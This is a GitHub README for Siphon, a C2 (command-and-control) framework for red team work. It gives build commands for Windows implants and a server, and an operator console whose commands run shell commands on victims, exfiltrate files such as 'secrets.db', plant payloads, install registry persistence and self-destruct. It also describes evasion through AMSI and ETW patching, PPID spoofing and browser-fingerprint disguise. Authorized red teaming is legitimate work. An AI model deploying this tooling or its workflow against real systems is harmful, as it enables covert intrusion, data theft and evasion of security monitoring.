<div align="center">

<picture>
  <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/Real-Fruit-Snacks/Siphon/main/docs/assets/logo-dark.svg">
  <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/Real-Fruit-Snacks/Siphon/main/docs/assets/logo-light.svg">
  <img alt="Siphon" src="https://raw.githubusercontent.com/Real-Fruit-Snacks/Siphon/main/docs/assets/logo-dark.svg" width="520">
</picture>

![Go](https://img.shields.io/badge/language-Go-00ADD8.svg)
![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20Windows-lightgrey)
![License](https://img.shields.io/badge/license-MIT-blue.svg)

**Lightweight C2 framework with per-session forward secrecy.**

ECDH P-256 key exchange, AES-256-GCM authenticated encryption, and uTLS Chrome fingerprinting over HTTPS beacon transport. Server public key embedded at build time — zero config files on disk.

> **Authorization Required**: Designed exclusively for authorized red team engagements with explicit written permission.

[Features](#features) · [Quick Start](#quick-start) · [Usage](#usage) · [Architecture](#architecture) · [Security](#security)

</div>

---

## Features

### ECDH Forward Secrecy

Ephemeral P-256 key exchange per session. Server public key embedded at build time via ldflags. Shared secrets zeroed after derivation.

```bash
make implant SERVER_PK=04a1b2... C2_HOST=https://10.0.0.5:443 SLEEP_SEC=10
```

### AES-256-GCM Transport

Authenticated encryption for all payloads. Unique nonce per message. HMAC-SHA256 covers the full envelope: ID, PubKey, Nonce, Ciphertext.

### uTLS Fingerprinting

Chrome JA3 fingerprint via `HelloChrome_Auto`. Cookie-based beacon transport blends with normal HTTPS traffic on standard endpoints.

### Operator Console

Interactive CLI with Catppuccin Mocha palette. Prefix-match implant selection, task queuing, and live result display.

```bash
siphon> implants
siphon> interact abc123
siphon(abc123)> cmd whoami
siphon(abc123)> upload C:\secrets.db
siphon(abc123)> persist registry
siphon(abc123)> selfdestruct
```

### Implant Builder

Cross-compile Windows implants from Linux. Server public key, C2 host, sleep interval, auth token, kill date, and custom endpoints configured via build variables. Stripped with `-s -w -trimpath`.

```bash
make implant SERVER_PK=<hex> C2_HOST=https://c2:443 SLEEP_SEC=10 AUTH_TOKEN=secret
```

---

## Quick Start

**Prerequisites:** Go 1.24+, Make

```bash
git clone https://github.com/Real-Fruit-Snacks/Siphon.git
cd Siphon

# Generate ECDH keypair + TLS certificate
make setup

# Build C2 server (Linux, stripped)
make server

# Build implant (Windows cross-compiled)
make implant SERVER_PK=<hex> C2_HOST=https://your-c2:443 SLEEP_SEC=10
```

---

## Usage

### Start the Server

```bash
./build/siphon-server \
  -listen :443 \
  -cert server/certs/server.crt \
  -key server/certs/server.key \
  -auth secret-token
```

### Interact with Implants

```bash
siphon> implants                       # list checked-in implants
siphon> interact abc123                # select by prefix match
siphon(abc123)> cmd whoami             # execute a command
siphon(abc123)> upload C:\secrets.db   # exfiltrate a file
siphon(abc123)> download payload.exe C:\Temp\svc.exe
siphon(abc123)> sleep 30               # change beacon interval
siphon(abc123)> persist registry       # install persistence
siphon(abc123)> selfdestruct           # remove the implant
```

### Build Targets

```bash
make setup          # Generate ECDH keypair + TLS certificate
make server         # Build C2 server (Linux amd64, stripped)
make implant        # Build implant (Windows amd64, cross-compiled)
make implant-linux  # Build implant (Linux amd64, for testing)
make clean          # Remove build artifacts and generated keys
```

---

## Architecture

```
shared/types.go              Protocol types: Beacon, Task, TaskResult, Envelope

server/
  crypto.go                  ECDH key exchange and AES-256-GCM
  handlers.go                HTTP handlers for beacon and submit
  cli.go                     Interactive operator console
  cmd/main.go                Server entry point; TLS cert generation

implant/
  main.go                    Entry point with exponential backoff
  comms.go                   ECDH key exchange and AES-256-GCM
  transport.go               HTTPS client with uTLS Chrome fingerprint
  tasks.go                   Task dispatcher: cmd, upload, download, sleep, persist
  evasion_windows.go         PPID spoofing, CREATE_NO_WINDOW
  patches_windows.go         ETW and AMSI patching

Makefile                     Build system with ldflags configuration
```

### Data Flow

```
Implant  ──  HTTPS GET /api/news (beacon)  ──▶  Server  ──▶  Task Queue
Implant  ◀──  Encrypted Task (AES-256-GCM)  ◀──  Server
Implant  ──  HTTPS POST /api/submit (result) ──▶  Server  ──▶  Loot Storage
```

### Encryption Flow

```
1. Implant generates ephemeral ECDH P-256 keypair
2. Derives shared secret using server's embedded public key
3. Shared secret → AES-256-GCM key
4. All payloads encrypted with unique nonce per message
5. HMAC-SHA256 covers envelope: ID + PubKey + Nonce + Ciphertext
6. Shared secret zeroed after key derivation
```

---

## Platform Support

| Capability | Linux (Server) | Windows (Implant) | Linux (Implant) |
|---|---|---|---|
| HTTPS Beacon | Full | Full | Full |
| ECDH + AES-GCM | Full | Full | Full |
| uTLS Fingerprint | N/A | Full | Full |
| Command Execution | N/A | `cmd.exe` + PPID spoof | `/bin/sh` |
| ETW Patching | N/A | Full | Stub |
| AMSI Patching | N/A | Full | Stub |
| PPID Spoofing | N/A | Full | Not supported |
| Persistence | N/A | Registry, schtask, startup | Stub |
| Self-Destruct | N/A | Full | Stub |

---

## Security

Report vulnerabilities via [GitHub Security Advisories](https://github.com/Real-Fruit-Snacks/Siphon/security/advisories). 90-day responsible disclosure.

| Property | Implementation |
|---|---|
| Forward secrecy | Ephemeral ECDH P-256 per session |
| Payload encryption | AES-256-GCM authenticated encryption |
| Key distribution | Server public key embedded via ldflags |
| Message auth | HMAC-SHA256 pre-shared token |
| Loot encryption | AES-256-GCM at rest |
| Path traversal | `filepath.Base()` sanitization |
| Binary hardening | `-s -w -trimpath` |
| TLS fingerprint | uTLS Chrome JA3 |

**Siphon does not:** harvest credentials, move laterally, escalate privileges, evade kernel-level EDR, destroy event logs, or generate payloads.

---

## License

[MIT](LICENSE) — Copyright 2026 Real-Fruit-Snacks
